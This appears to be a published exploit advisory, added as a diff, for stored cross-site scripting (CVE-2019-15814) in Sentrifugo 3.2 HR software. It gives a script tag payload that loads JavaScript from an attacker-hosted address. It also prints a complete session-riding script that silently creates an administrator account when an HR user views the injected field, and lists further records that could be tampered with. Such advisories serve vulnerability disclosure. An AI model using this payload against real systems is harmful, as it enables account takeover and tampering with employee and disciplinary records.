@@ -1,0 +1,62 @@
+# Exploit Title: Sentrifugo 3.2 - Persistent Cross-Site Scripting
+# Google Dork: N/A
+# Date: 8/29/2019
+# Exploit Author: creosote
+# Vendor Homepage: http://www.sentrifugo.com/
+# Version: 3.2
+# Tested on: Ubuntu 18.04
+# CVE : CVE-2019-15814
+
+
+Multiple Stored XSS vulnerabilities were found in Sentrifugo 3.2. In most test cases session riding was also possible by utilizing the XSS vulnerability. This potentially allows for full account takeover.
+
+/sentrifugo/index.php/employee/edit/id/5  <--Attacker employee ID here. POC example pertains to this one.
+/sentrifugo/index.php/feedforwardquestions/add
+/sentrifugo/index.php/announcements/add
+
+# Proof of Concept
+
+A low privileged user can insert a stored XSS referencing a crafted js file that would ride a session of an admin user to create an additional admin user. Logged in as the low priv user, insert the following in "Certificate Description" (Self Service >> My Details >> Training and Certificate Details)
+
+<script src="http://Attacker-IP/add-admin-user.js"></script>
+
+Add the following 'add-admin-user.js' file hosted on your attacking machine. This request will need to be customized per instance of Sentrifugo.
+
+A few crafting notes:
+
+- 'employeeId' - this can be found in the users profile.
+- 'employeeNumId' - this can be an arbitrary number as long as it does not exist.
+- 'emprole' - in this test case '2_1' was the Administrator role
+- 'emp_status_id' - based off  "Contractor", "Full-Time", etc. Contractor is '6' in this case.
+- 'emailaddress' - by default the initial password is sent via email, so this will need to be valid in order to login.
+
+----------------------------------------------------------------------------------------------------
+
+function execute()
+{
+  var nuri ="http://10.42.1.42/sentrifugo/index.php/employee/add";
+  xhttp = new XMLHttpRequest();
+  xhttp.open("POST", nuri, true);
+  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+  xhttp.withCredentials = "true";
+  var body = "";
+  body += "\r\n\r\n";
+  body += 
+	"id=&final_emp_id=EMPP99&tmp_emp_name=Select+Candidate&employeeId=EMPP&employeeNumId=99" +
+	"&firstname=Bob&lastname=Blah&modeofentry=Direct&emprole=2_1&emailaddress=bob%40localhost.com" +
+	"&businessunit_id=0&reporting_manager=2&emp_status_id=6&screenflag=add&date_of_joining=07%2F04%2F2019&submit=Save";
+  xhttp.send(body);
+  return true;
+}
+
+execute();
+
+----------------------------------------------------------------------------------------------------
+
+When a user with permissions to add users (HR role by default) views your XSS "Certification Description" the add user request should be sent.
+
+Other session riding request that can possibly be crafted:
+- Company Announcement - gets blasted out to all users. Also has an additional XSS vuln in the description.
+- Add Employee Leave - this one is tricky to craft due to needed parameter knowledge.
+- Background check - update or add employee background check status.
+- Disciplinary Actions - manipulate existent or non-existent disciplinary records.
